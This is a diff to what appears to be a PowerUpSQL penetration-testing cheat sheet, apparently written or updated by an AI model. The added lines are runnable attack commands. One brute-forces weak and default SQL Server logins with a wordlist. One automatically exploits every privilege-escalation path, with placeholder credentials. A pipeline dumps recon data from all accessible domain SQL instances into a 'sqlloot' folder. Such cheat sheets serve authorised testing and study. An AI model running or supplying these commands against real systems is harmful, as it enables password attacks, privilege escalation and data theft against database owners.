@@ -36,6 +36,10 @@ Get-SQLInstanceScanUDP -ComputerName 192.168.1.0/24
 
 # Check a specific instance
 Get-SQLConnectionTest -Instance "MSSQL01\SQLEXPRESS"
+
+# Sweep accessible instances for weak/default SQL logins (tries login-name-as-password + a wordlist)
+Invoke-SQLAuditWeakLoginPw -Instance "MSSQL01" -Verbose
+Invoke-SQLAuditWeakLoginPw -Instance "MSSQL01" -PassFile .\pw.txt -Exploit -Verbose
 ```
 
 ---
@@ -90,6 +94,11 @@ Invoke-SQLAuditPrivTrustworthy -Instance "MSSQL01" -Exploit -Verbose
 
 # Full privilege audit (checks every known privesc path, incl. xp_cmdshell usability)
 Invoke-SQLAudit -Instance "MSSQL01" -Verbose
+
+# One-shot: auto-TRY every escalation path and exploit whatever works (impersonate / trustworthy / etc.)
+Invoke-SQLEscalatePriv -Instance "MSSQL01" -Verbose
+# With explicit creds instead of the current token:
+Invoke-SQLEscalatePriv -Instance "MSSQL01" -Username evil -Password 'Password123!' -Verbose
 
 # There is NO Invoke-SQLAuditPrivXpCmdshell. For xp_cmdshell, Invoke-SQLAudit flags it and
 # Invoke-SQLOSCmd auto-enables it if you're sysadmin (see OS Command Execution below).
@@ -183,6 +192,12 @@ Get-SQLInstanceDomain |
   Where-Object {$_.Status -eq "Accessible"} |
   Invoke-SQLAudit -Verbose |
   Out-GridView
+
+# Bulk-dump all recon from every accessible instance to files for offline analysis (CSV default, -XML optional)
+Get-SQLInstanceDomain |
+  Get-SQLConnectionTestThreaded |
+  Where-Object {$_.Status -eq "Accessible"} |
+  Invoke-SQLDumpInfo -OutFolder .\sqlloot -Verbose
 ```
 
 ---
@@ -201,5 +216,5 @@ Get-SQLInstanceDomain |
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-08-27*
-*Model: claude-opus-5*
+*Updated: 2026-09-29*
+*Model: claude-opus-4-8*
